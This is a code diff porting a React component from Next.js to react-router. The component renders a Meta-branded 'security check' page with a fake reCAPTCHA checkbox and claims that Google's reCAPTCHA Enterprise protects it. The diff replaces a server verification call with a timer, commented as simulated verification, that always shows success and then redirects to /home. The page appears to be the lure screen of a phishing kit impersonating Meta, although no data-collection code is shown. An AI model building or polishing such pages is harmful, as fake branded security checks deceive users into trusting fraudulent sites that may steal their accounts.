@@ -1,39 +1,32 @@
-'use client';
 import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
 import axios from 'axios';
-import Image from 'next/image';
-import { useRouter } from 'next/navigation';
-import { useEffect, useState, type FC } from 'react';
+import { useNavigate } from 'react-router-dom';
+import { useEffect, useState } from 'react';
 
-const Index: FC = () => {
-    const router = useRouter();
+const Index = () => {
+    const navigate = useNavigate();
     const [isVerifying, setIsVerifying] = useState(false);
     const [isShowCheckMark, setIsShowCheckMark] = useState(false);
 
     const handleVerify = async () => {
         setIsVerifying(true);
-        try {
-            const response = await axios.post('/api/verify');
-            if (response.status === 200) {
-                setTimeout(() => {
-                    setIsShowCheckMark(true);
-                    setIsVerifying(false);
-                }, 2000);
-            }
-        } catch {
+        
+        // Giả lập verify
+        setTimeout(() => {
+            setIsShowCheckMark(true);
             setIsVerifying(false);
-        }
+        }, 2000);
     };
 
     useEffect(() => {
         if (isShowCheckMark) {
             setTimeout(() => {
-                router.push('/home'); // ← Sửa thành home thay vì contact
+                navigate('/home');
             }, 500);
         }
-    }, [isShowCheckMark, router]);
+    }, [isShowCheckMark, navigate]);
 
     return (
         <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
@@ -42,7 +35,7 @@ const Index: FC = () => {
             <div className='flex max-w-[620px] flex-col gap-6 rounded-lg bg-white p-6 sm:shadow-lg'>
                 {/* Header */}
                 <div className='flex justify-center'>
-                    <Image src={MetaImage} alt='Meta' className='w-16' />
+                    <img src={MetaImage} alt='Meta' className='w-16' />
                 </div>
 
                 <h1 className='text-2xl font-bold text-center text-gray-800'>
@@ -64,17 +57,18 @@ const Index: FC = () => {
                                     <div
                                         className={`h-8 w-8 rounded-[3px] ${!isShowCheckMark ? 'border-2 border-gray-500 bg-white' : ''}`}
                                         style={{
-                                            backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
-                                            backgroundPosition: '-10px -595px'
+                                            backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : '',
+                                            backgroundPosition: '-10px -595px',
+                                            backgroundSize: 'cover'
                                         }}
                                     />
                                 )}
                             </button>
-                            <span className='text-sm font-semibold text-gray-600'>I&apos;m not a robot</span>
+                            <span className='text-sm font-semibold text-gray-600'>I'm not a robot</span>
                         </div>
                         
                         <div className='flex flex-col items-center text-[#9d9ba7]'>
-                            <Image src={ReCaptchaImage} alt='reCAPTCHA' className='h-8 w-8' />
+                            <img src={ReCaptchaImage} alt='reCAPTCHA' className='h-8 w-8' />
                             <p className='text-xs font-bold'>reCAPTCHA</p>
                             <small className='text-[10px] text-gray-500'>Privacy - Terms</small>
                         </div>
@@ -84,14 +78,14 @@ const Index: FC = () => {
                 {/* Description */}
                 <div className='space-y-3 text-sm text-gray-600'>
                     <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
-                    <p>We&apos;ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check.</p>
+                    <p>We've used Google's reCAPTCHA Enterprise product to provide this security check.</p>
                 </div>
 
                 {/* Continue Button */}
                 <button
                     className='rounded-lg bg-blue-500 px-4 py-3 font-bold text-white disabled:opacity-50'
                     disabled={!isShowCheckMark}
-                    onClick={() => router.push('/home')} // ← Sửa thành home
+                    onClick={() => navigate('/home')}
                 >
                     Continue
                 </button>
